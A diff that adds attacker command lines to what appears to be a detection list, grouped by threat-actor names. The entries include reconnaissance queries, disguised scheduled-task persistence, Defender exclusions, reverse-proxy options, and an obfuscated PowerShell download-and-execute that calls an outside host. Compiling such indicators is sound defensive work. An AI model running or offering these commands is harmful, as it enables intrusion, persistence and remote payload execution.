@@ -115,5 +115,86 @@ pwsh.exe -NonI -W Hidden -Exec Bypass
 Add-MpPreference -ExclusionPath %LOCALAPPDATA%
 powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc
 
+# Albino Ghouls
+SELECT * FROM Win32_ComputerSystem
+SELECT * FROM Win32_Processor
+SELECT UUID FROM Win32_ComputerSystemProduct
+SELECT * FROM AntiVirusProduct
+SELECT * FROM Win32_BIOS
+
+cmd.exe /c
+cmd.exe /u /c "dir /-c /4 /a "C:\" >
+cmd.exe /u /c "wmic logicaldisk get deviceid,volumename,caption,description,size >
+
+schtasks.exe /create /tn 'Flash Player Update' /sc HOURLY /tr "wscript 
+
+7z.exe a -t7z -r0 -mmt2 -ms=off -y "
+nircmd.exe "savescreenshotfull" 
+elevatecmd
+execmd
+killprocess
+memdump
+runas
+runassystem
+savescreenshotfull
+
+# Stone Wolf
+"c:\st\Autoit3.exe" c:\st\script.a3x
+forfiles.exe /p C:\Windows\System32 /m cmmon32.exe /c powershell . \*i*\*2\msh*e https://sportsboulevard-shop.com/nico/Scan_RusAutomation_TZ_298_21.08.2024
+
+# Bloody Wolf
+schtasks /create /sc minute /mo 30 /tn Skype /tr C:\Users\
+\AppData\Roaming\AdiletGovKZ.jar
+exe /c shutdown /r /t 0
+exe /c shutdown /s /t 0
+exe -jar 
+exe /c 
+exe /c wmic /node:. /namespace:'//root/cimv2' path win32_process get name,processed,commandline /format:list
+exe /c wmic /node:. /namespace:'//root/cimv2' path win32_startupcommand get name,location, /format:list
+
+chrome.exe -new-window data:text/html,<title>Strigoi Browser</title> -mute-audio -disable-audio -window-position=
+firefox.exe -new-window data:text/html,<title>Strigoi Browser</title>
+
+exe /c net user 
+exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v "dontdisplaylastusername" /t REG_DWORD /d 1 /f
+
+cmd.exe /c net user
+cmd.exe /c wmic /node:. /namespace:'\\\\root\cimv2' path win32_userprofile where "LocalPath='
+cmd.exe /c reg add HKLM\Software\Microsoft\CurrentVersion\Policies\System /v "dontdisplaylastusername" /t REG_DWORD /d 0 /f
+
+%ProgramData%\WindowsDefender\Update\SecuritySystrayw.exe %ProgramData%\WindowsDefender\Update\v.3 -ip %ProgramData%\WindowsDefender\Update\sys -c %ProgramData%\WindowsDefende\Update\loc -A
+
+# Shedding Zmiy
+revsocks
+connect
+pass
+socks
+tls
+ws
+proxy
+proxyauth
+useragent
+
+# Awaken Likho
+RunProgram="hidcon:cmd /c  copy /y \"%CD%\*.*\" \"%CD%\..\\\""
+RunProgram="hidcon:cmd /c  cd %TEMP% & copy 1043685322228623 1043685322228623.cmd"
+RunProgram="hidcon:cmd /c  cd %TEMP & 1043685322228623.cmd"
+
+-autoreconnect
+-id
+-connect
+
+# IAmTheKing
+cmd.exe /v:on /c findstr "::::::::::::.*" "резюме.lnk" > "%tmp%\honor.vbs" & cscript.exe "%tmp\honor.vbs" & del "%tmp%\honor.vbs"
+Shell32.DLL,ShellExec_RunDLL %comspec% /c set p1=-e&&set p2=Xe&&set p3=C B&&set p4=Y&&set p5=Pa&&set p6=sS&&%comspec% /c echo sal a New-Object;$wa=a`Ne`T.`Web`Cli`ent;
+$wa.DownloadFile('htt'+'p://w'+'eb.ara'+'bleaguen'+'ews.com:4'+'43/?s=4263'+'35925316043a*r=Q'+'25tRZjvj'+' QY3mRJaUU9iHzkTUD6dFKtQUIXI=',%temp%\jlnli.ps1");%temp%\jlnli.ps1 ^| powershell %p1%%p2%%p3%%p4%%p5%%p6% -w 1 -file -
+
+# GOFFEE
+DigitalRSASignature
+CHECKSUM
+%USERPROFILE%\UserCache.ini
+%USERPROFILE%\UserCache.ini.hta
+HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows
+
 # Do not remove the line
 
